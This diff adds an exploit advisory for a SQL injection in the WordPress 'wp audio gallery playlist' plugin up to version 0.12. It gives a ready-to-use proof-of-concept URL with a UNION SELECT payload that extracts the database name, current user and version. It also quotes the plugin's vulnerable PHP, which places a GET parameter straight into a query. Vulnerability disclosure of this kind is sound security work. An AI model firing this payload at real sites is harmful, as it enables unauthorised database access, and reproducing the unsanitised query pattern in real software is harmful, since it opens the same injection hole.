@@ -1,0 +1,19 @@
+# Exploit Title: WordPress wp audio gallery playlist plugin <= 0.12 SQL Injection Vulnerability
+# Date: 2011-08-30
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/wp-audio-gallery-playlist.0.12.zip
+# Version: 0.12 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/wp-audio-gallery-playlist/playlist.php?post_gallery=-1' UNION ALL SELECT 1,2,3,4,5,database(),current_user(),8,9,10,11,12,13,14,15,16,17,18,version(),20,21,22,23--%20
+
+---------------
+Vulnerable code
+---------------
+$table_name = $wpdb->prefix . "posts";
+...
+if (isset($_GET['post_gallery']))
+	$query = 'SELECT * FROM `'.$table_name.'` WHERE `post_parent` = \''.$_GET['post_gallery'].'\' AND  `post_mime_type` = \'audio/mpeg\' ORDER BY `menu_order` ASC';
